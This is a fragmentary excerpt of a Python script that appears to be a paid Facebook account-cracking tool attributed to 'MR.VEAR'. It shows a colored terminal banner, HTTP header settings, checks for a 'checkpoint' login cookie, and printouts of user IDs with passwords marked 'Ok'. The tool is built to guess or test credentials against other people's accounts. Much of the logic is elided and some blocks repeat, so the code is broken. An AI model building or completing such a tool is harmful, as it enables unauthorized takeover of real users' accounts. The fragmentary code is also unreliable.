...
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mADD MY FB")
...
╠══[Author                   • \33[1;38mMR.VEAR ]\33[1;38m     ║\033[1;31m 

╠══[Facebook                 • ‌vearahmad ]   ║  \033[1;97m  
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
   ...
   "scheme": 'https', 
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " MR.VEAR,  Ok,  id"')
   ...
   "scheme": 'https', 
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•MR.VEAR-Ok] {idf} • {pw} ')
